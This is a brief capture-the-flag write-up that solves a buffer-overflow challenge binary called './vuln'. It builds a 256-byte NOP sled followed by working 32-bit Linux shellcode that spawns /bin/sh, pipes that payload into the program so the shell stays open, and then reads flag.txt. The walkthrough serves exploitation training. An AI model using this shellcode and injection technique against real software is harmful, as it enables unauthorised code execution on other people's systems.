1) make a python file (or adapt and run from terminal) and add the command:
print("\x90"*256 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")
The first part is the nop slide which will mean no matter where it executes it will go through the slide down the slide (hence the challenge name) and execute
The second part is shellcode which will execute a shell
2) in terminal perform:
python exploit.py > payload.txt
exploit.py being the python file 
then execute the command:
cat payload.txt - | ./vuln
the first part prints the payload, the "-" stops the shell from closing immedietly, and the "| ./vuln" puts the payload into the program
3) cat flag.txt
